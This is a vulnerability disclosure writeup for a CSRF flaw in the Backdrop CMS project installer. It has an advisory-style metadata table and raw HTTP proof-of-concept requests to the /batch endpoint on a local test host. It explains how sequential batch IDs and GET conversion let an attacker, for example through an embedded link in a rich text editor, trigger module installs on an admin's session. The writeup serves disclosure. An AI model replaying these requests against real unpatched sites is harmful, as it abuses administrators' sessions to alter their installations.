# Backdrop core - Cross Site Request Forgery in project installer

| Field | Value |
| --- | --- |
| Vulnerability name | Cross Site Request Forgery (project installer) |
| Vulnerability type | software |
| CVE ID | pending |
| CWE | CWE-352 (Cross-Site Request Forgery) |
| Product name | Backdrop core |
| Product vendor | Backdrop CMS |
| Product version | 1.33.x < 1.33.2; 1.32.x < 1.32.3 |
| Product link | https://backdropcms.org |
| Product environment | web |
| Severity | Critical |
| CVSS score | - |
| CVSS vector | - |
| Affected assets | - |
| Affected users | - |
| Date of reporting | Apr 22, 2026 |
| Date published | Apr 22, 2026 |
| Vendor acknowledgement | Yes (BACKDROP-SA-CORE-2026-002) |
| PoC / exploit | Included in writeup below |
| Advisory | https://backdropcms.org/security/backdrop-sa-core-2026-002 |
| CVE doc link | - |
| Credit | 0xhamy (Hamed Kohi) |

---
## CSRF 1 - Installing modules

Through this page you can add a module to an installation queue:
http://127.0.0.1:8081/admin/modules/install

But the POST request for this doesn't have a CSRF token and can be converted to GET.

This request is used for installing the module:
```
GET /batch?op=start&id=5 HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: http://127.0.0.1:8081/admin/installer/install/select_versions
Connection: keep-alive
Cookie: <authenticated admin session cookies redacted>
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
```

This too and can be converted to GET:
```
POST /batch?id=5&op=do_nojs&op=do HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Origin: http://127.0.0.1:8081
Connection: keep-alive
Referer: http://127.0.0.1:8081/batch?op=start&id=5
Cookie: <authenticated admin session cookies redacted>
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Content-Length: 0

```

The interesting point is that the batch id increases every time you want to install something, so technically if there are module in a queue, you can trigger installation for them.

We can install modules but we can't enable them without CSRF token. 

GET requests can easily be triggered with a rich text editor.



---
